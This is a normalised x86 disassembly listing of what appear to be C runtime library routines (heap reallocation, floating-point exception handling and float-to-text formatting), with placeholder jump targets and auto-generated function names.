call [ GetStringTypeW@IAT ]
mov edi eax
push eax
call sub_42276a
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_42fa60
mov esi esp
test esi esi
je r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_43180c
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4247f2
push [ ebp + 0x20 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_431720
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_43184a
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_42276a
pop ecx
pop ebp
retn
push ebx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_422732
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_429a64
pop ecx
call sub_427b11
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
inc esi
mov eax ebx
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop ebx
call sub_427b11
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_427b24
pop ecx
mov [ esi ] eax
push esi
call sub_429a64
pop ecx
test eax eax
je r-xdata
call sub_427b11
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_427b24
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_4318f5
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jae r-xdata
xor ecx ecx
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_427b11
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push esi
call sub_429a64
pop ecx
test eax eax
jne r-xdata
mov eax ecx
mov [ eax ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov [ eax ] 0xc
sub_43197e
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
push edi
fldz
fucom st1
fnstsw ax
test ah 0x44
jpe r-xdata
push esi
mov si [ ebp + 0xe ]
movzx eax si
test eax 0x7ff0
jne r-xdata
fstp st1
xor edi edi
jmp r-xdata
push 0x0
fstp st0
push ecx
push ecx
fstp [ esp ]
call sub_431a50
movzx edi si
shr edi 0x4
and edi 0x7ff
add esp 0xc
sub edi 0x3fe
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
test ecx 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
pop edi
pop ebp
retn
fcompp
mov edi 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
test edx edx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
mov ecx 0xffef
and si cx
mov [ ebp + 0xe ] si
test eax eax
je r-xdata
add ecx ecx
mov [ ebp + 0xc ] ecx
test edx edx
jns r-xdata
test [ ebp + 0xe ] 0x10
jne r-xdata
fld [ ebp + 0x8 ]
push 0x0
push ecx
push ecx
fstp [ esp ]
call sub_431a50
add esp 0xc
jmp r-xdata
mov eax 0x8000
or si ax
mov [ ebp + 0xe ] si
add edx edx
dec edi
test [ ebp + 0xe ] 0x10
je r-xdata
or ecx 0x1
mov [ ebp + 0xc ] ecx
pop esi
mov si [ ebp + 0xe ]
mov [ ebp + 0x8 ] edx
sub_431a50
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
movzx eax [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
lea ecx [ ecx + 0x3fe ]
shl ecx 0x4
and eax 0x800f
or ecx eax
mov [ ebp - 0x2 ] cx
fld [ ebp - 0x8 ]
leave
retn
sub_431a7b
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ebx
and esi 0x1f
test bl 0x8
je r-xdata
test bl 0x4
je r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
test bl 0x1
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push 0x1
call sub_432038
pop ecx
and esi 0xfffffff7
jmp r-xdata
test bl 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_432038
pop ecx
and esi 0xfffffffb
jmp r-xdata
test bl 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_432038
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
push edi
xor edi edi
test bl 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_432038
pop ecx
and esi 0xffffffef
mov ecx [ ebp + 0xc ]
fld [ ecx ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
inc edi
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
xor edi edi
inc edi
fld [ ecx ]
lea eax [ ebp + 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_43197e
mov eax [ ebp + 0x8 ]
fst [ ebp - 0xc ]
fldz
add eax 0xfffffa00
add esp 0xc
mov [ ebp + 0x8 ] eax
cmp eax 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and esi 0xfffffffd
push 0x10
call sub_432038
pop ecx
fcompp
xor edx edx
fnstsw ax
test ah 0x41
jne r-xdata
xor edi edi
fmulp st1
inc edi
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
mov eax [ ebp - 0x6 ]
and eax 0xf
or eax 0x10
mov [ ebp - 0x6 ] ax
mov eax [ ebp + 0x8 ]
mov ecx 0xfffffc03
cmp eax ecx
jge r-xdata
inc edx
mov eax [ ebp + 0xc ]
fstp [ eax ]
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0xc ]
test edx edx
je r-xdata
sub ecx eax
mov eax [ ebp - 0xc ]
test edi edi
pop edi
je r-xdata
fchs
shr eax 0x1
test [ ebp - 0x8 ] 0x1
mov [ ebp - 0xc ] eax
je r-xdata
test edi edi
jne r-xdata
shr [ ebp - 0x8 ] 0x1
dec ecx
jne r-xdata
or eax 0x80000000
mov [ ebp - 0xc ] eax
inc edi
test [ ebp - 0xc ] 0x1
je r-xdata
sub_431c57
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_431c78
add esp 0x1c
pop ebp
retn
sub_431c78
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push ebx
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0x10 ]
inc ebx
push edi
test cl 0x10
je r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edi 0xc000008f
or [ eax + 0x4 ] ebx
jmp r-xdata
test cl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000093
or [ eax + 0x4 ] 0x2
test cl 0x2
je r-xdata
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000091
or [ eax + 0x4 ] 0x4
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc000008e
or [ eax + 0x4 ] 0x8
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
shl eax 0x4
not eax
xor eax [ ecx + 0x8 ]
and eax 0x10
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
add eax eax
not eax
xor eax [ ecx + 0x8 ]
and eax 0x8
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
shr eax 0x1
not eax
xor eax [ ecx + 0x8 ]
and eax 0x4
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
shr eax 0x3
not eax
xor eax [ ecx + 0x8 ]
and eax 0x2
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
shr eax 0x5
not eax
xor eax [ ecx + 0x8 ]
and eax ebx
xor [ ecx + 0x8 ] eax
call sub_43208e
mov edx eax
test dl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000090
or [ eax + 0x4 ] 0x10
test dl 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test dl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x8
test dl 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x4
test dl 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffeb
or eax 0x8
cmp eax 0x200
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffd
or eax ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x20 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x20 ] eax
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov ecx [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
mov eax [ ecx + 0x60 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x60 ] eax
fld [ ebx ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
mov eax [ ebp + 0x8 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ eax + 0x60 ] 0xffffffe1
mov eax [ ebp + 0x8 ]
fld [ ebx ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffe7
or eax 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffe
or eax 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_432000
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
push edi
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] 0x1
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
mov edx 0xfffff3ff
sub eax 0x0
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ ebx ]
fld [ ecx + 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] 0x0
pop esi
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax 0x0
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_431f5d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
je r-xdata
call sub_427b11
mov [ eax ] 0x21
add eax 0xfffffffe
cmp eax 0x1
ja r-xdata
pop ebp
retn
call sub_427b11
mov [ eax ] 0x22
pop ebp
retn
sub_431f8a
push 0x8
push r--data
call sub_429ad0
cmp [ rw-data ] 0x1
jl r-xdata
call sub_429b15
retn
mov eax [ ebp + 0x8 ]
test al 0x40
je r-xdata
and eax 0xffffffbf
mov [ ebp + 0x8 ] eax
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_43200f
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
not ecx
and cx [ ebp - 0x4 ]
or cx ax
movzx eax cx
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_432038
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_432164
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_432185
add esp 0x1c
pop ebp
retn
sub_432185
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4326d2
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_432888
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43220b
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_432947
jmp r-xdata
sub_43220b
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
push 0x30
pop eax
push [ ebp + 0x1c ]
mov ecx eax
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x8 ] 0x3ff
xor ebx ebx
call sub_4247f2
mov edi [ ebp + 0x14 ]
test edi edi
jns r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov edi ebx
call sub_427b11
push 0x16
jmp r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
pop edi
mov [ eax ] edi
call sub_42a231
jmp r-xdata
lea eax [ edi + 0xb ]
mov [ esi ] bl
cmp ecx eax
ja r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ebx [ edx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax ebx
shr eax 0x14
and eax 0x7ff
cmp eax 0x7ff
jne r-xdata
call sub_427b11
push 0x22
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x24 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
xor eax eax
cmp eax eax
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov ebx [ ebp + 0x18 ]
push 0x30
pop eax
mov [ esi ] al
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi + 0x1 ] al
mov ecx [ edx + 0x4 ]
and ebx 0xffffffe0
add ebx 0x27
and ecx 0x7ff00000
xor eax eax
or eax ecx
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov [ esi ] 0x2d
inc esi
and ebx 0x80000000
or eax ebx
je r-xdata
or eax 0xffffffff
cmp ecx eax
je r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
push 0x30
pop eax
mov [ esi + 0x2 ] al
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
and eax 0xfffff
add esi 0x3
or ecx eax
jne r-xdata
push 0x0
push edi
push eax
lea ebx [ esi + 0x2 ]
push ebx
push edx
call sub_432565
mov edi eax
add esp 0x14
test edi edi
je r-xdata
lea eax [ ecx - 0x2 ]
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ ecx ] al
mov [ ecx ] 0x0
jmp r-xdata
mov [ ebp - 0x8 ] 0x3fe
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
mov [ esi ] 0x0
jmp r-xdata
and [ ebp + 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx 0xf0000
mov [ ebp + 0xc ] ecx
cmp [ edx ] 0x0
jbe r-xdata
mov eax [ edx + 0x4 ]
and eax 0xfffff
mov [ ebp - 0x18 ] eax
ja r-xdata
mov ecx esi
inc esi
mov [ ebp - 0xc ] ecx
test edi edi
jne r-xdata
mov edi [ ebp + 0x18 ]
push 0x30
pop eax
mov [ esi ] al
test edi edi
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
lea eax [ esi + 0x2 ]
push 0x65
push eax
call sub_4237c0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
test ax ax
js r-xdata
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp + 0x14 ]
and edx ecx
mov ecx [ ebp - 0x4 ]
movsx ecx cx
and edx 0xfffff
call sub_438260
push 0x30
pop ecx
add ax cx
movzx eax ax
cmp eax 0x39
jbe r-xdata
test edi edi
jle r-xdata
xor edi edi
jmp r-xdata
test edi edi
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp + 0x14 ]
and edx ecx
mov ecx [ ebp - 0x4 ]
movsx ecx cx
and edx 0xfffff
call sub_438260
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ esi ] al
mov eax [ ebp + 0x14 ]
shrd eax ecx 0x4
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x4 ]
shr ecx 0x4
sub eax 0x4
inc esi
dec edi
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] eax
test ax ax
jns r-xdata
add eax ebx
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push edi
push 0x30
pop eax
push eax
push esi
call sub_427900
add esp 0xc
add esi edi
push 0x30
lea eax [ esi - 0x1 ]
pop ebx
test edi edi
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edx ]
mov edx [ edx + 0x4 ]
mov cl 0x34
call sub_438260
mov ecx eax
xor eax eax
mov ebx edx
and ecx 0x7ff
and ebx eax
sub ecx [ ebp - 0x8 ]
sbb ebx eax
js r-xdata
mov esi eax
mov [ eax ] bl
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg ecx
adc ebx eax
neg ebx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
mov ebx [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
je r-xdata
cmp esi edi
jne r-xdata
mov edx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp ecx eax
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
push eax
push 0xa
push ebx
push ecx
call sub_438180
add al 0x30
mov [ esi ] al
mov [ ebp - 0x18 ] edx
inc esi
mov [ ebp - 0x18 ] ebx
xor eax eax
cmp ebx eax
jl r-xdata
push eax
push edx
push ebx
push ecx
call sub_438180
add al 0x30
mov [ esi ] al
inc esi
xor eax eax
mov [ ebp - 0x18 ] edx
cmp esi edi
jne r-xdata
cmp ecx edx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp ebx eax
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
add cl 0x30
mov [ esi ] cl
mov [ esi + 0x1 ] al
mov edi eax
jg r-xdata
push eax
push 0x64
push ebx
push ecx
call sub_438180
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x18 ] edx
xor eax eax
cmp ebx eax
jl r-xdata
cmp ecx 0xa
jb r-xdata
jg r-xdata
cmp ecx 0x64
jb r-xdata
sub_432583
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push edi
push [ ebp + 0x20 ]
call sub_4247f2
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_427b11
push 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
pop edi
mov [ eax ] edi
call sub_42a231
jmp r-xdata
mov edx [ ebp + 0x10 ]
xor edi edi
mov eax edx
test edx edx
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
add eax 0x9
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edi
mov eax edi
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_427b11
push 0x22
mov eax [ ebp + 0x18 ]
push esi
cmp [ eax ] 0x2d
mov esi ebx
jne r-xdata
mov ecx [ ebp + 0x18 ]
xor eax eax
test edx edx
setg al
push eax
xor eax eax
cmp [ ecx ] 0x2d
sete al
add eax ebx
push eax
call sub_432bc8
mov edx [ ebp + 0x10 ]
pop ecx
pop ecx
test edx edx
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x1c ] al
sete al
add eax edx
add esi eax
or eax 0xffffffff
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
mov [ esi ] al
mov eax [ ebp - 0x10 ]
inc esi
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
push r--data
push eax
push esi
call sub_42eb0a
add esp 0xc
test eax eax
jne r-xdata
mov eax ebx
sub eax esi
add eax [ ebp + 0xc ]
push edi
push edi
push edi
push edi
push edi
call sub_42a241
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x14 ] edi
je r-xdata
mov edx [ ebp + 0x18 ]
mov eax [ edx + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop esi
je r-xdata
mov edx [ edx + 0x4 ]
dec edx
jns r-xdata
cmp [ ecx ] 0x30
jne r-xdata
push 0x64
pop ebx
cmp edx ebx
jl r-xdata
neg edx
mov [ esi + 0x1 ] 0x2d
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_421ef0
add esp 0xc
push 0xa
pop ebx
cmp edx ebx
jl r-xdata
mov eax edx
cdq
idiv ebx
add [ esi + 0x2 ] al
add [ esi + 0x4 ] dl
mov eax edx
cdq
idiv ebx
add [ esi + 0x3 ] al
sub_4326d2
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_4380ea
add esp 0x14
test edi edi
jne r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_427b11
or ecx 0xffffffff
cmp esi ecx
je r-xdata
call sub_427b11
push 0x16
pop esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebx + 0x1 ]
push eax
push ecx
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
xor eax eax
test ebx ebx
setg al
add ecx edi
add eax ecx
push eax
call sub_437e5c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
mov ecx esi
sete al
sub ecx eax
xor eax eax
test ebx ebx
setg al
sub ecx eax
mov [ eax ] esi
call sub_42a231
mov eax esi
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
push ebx
push esi
push edi
call sub_432583
add esp 0x1c
mov [ edi ] 0x0
jmp r-xdata
sub_43279e
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x14 ]
push ebx
mov eax [ eax + 0x4 ]
push esi
push [ ebp + 0x1c ]
dec eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
call sub_4247f2
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_427b11
push 0x16
pop ebx
mov [ eax ] ebx
call sub_42a231
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp [ ebp + 0x18 ] bl
je r-xdata
pop esi
mov eax ebx
pop ebx
leave
retn
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x2d
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx edi
jne r-xdata
mov eax [ eax + 0x4 ]
test eax eax
jg r-xdata
mov [ esi ] 0x2d
inc esi
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ edx ] 0x2d
sete al
add eax ecx
mov [ eax + esi ] 0x30
add esi eax
push 0x1
push esi
call sub_432bc8
